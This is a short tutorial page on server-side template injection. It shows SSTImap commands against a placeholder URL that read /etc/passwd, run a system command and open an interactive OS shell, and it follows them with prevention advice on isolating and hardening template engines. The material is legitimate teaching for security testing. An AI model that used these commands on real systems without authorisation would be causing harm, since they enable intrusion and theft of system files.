# SSTI Tools of the Trade & Preventing SSTI

**Tools of the Trade**

One of the most effective tools for SSTI exploitation is **SSTImap**, a modern alternative to the now-deprecated tplmap. To get started with SSTImap, you can clone its repository and install the necessary dependencies. Once set up, you can use it to identify SSTI vulnerabilities and the template engine in use by providing a target URL. For example, running SSTImap can reveal injection points, the template engine (like Twig), and various capabilities for exploitation, such as executing system commands or downloading files.

**Example Commands:**

*   To identify vulnerabilities:

    ```bash
    python3 sstimap.py -u http://example.com/index.php?name=test
    ```
*   To download a file:

    {% code overflow="wrap" %}
    ```bash
    python3 sstimap.py -u http://example.com/index.php?name=test -D '/etc/passwd' './passwd'
    ```
    {% endcode %}
*   To execute a command:

    ```bash
    python3 sstimap.py -u http://example.com/index.php?name=test -S id
    ```
*   To obtain an interactive shell:

    ```bash
    python3 sstimap.py -u http://example.com/index.php?name=test --os-shell
    ```

**Prevention Strategies**

Preventing SSTI vulnerabilities is crucial. The primary defense is to ensure that user input is never directly passed to the template engine's rendering function. This can be achieved by thoroughly reviewing code paths to eliminate any potential for user input to reach the rendering stage.

For applications that allow users to modify or upload templates, implementing hardening measures is essential. This includes removing dangerous functions from the template engine's execution environment to mitigate the risk of remote code execution. However, this approach can be bypassed, so a more robust solution is to isolate the template engine in a separate execution environment, such as a Docker container, to enhance security.

By equipping ourselves with the right tools and knowledge, we can effectively identify, exploit, and prevent SSTI vulnerabilities, fostering a safer web environment for all.
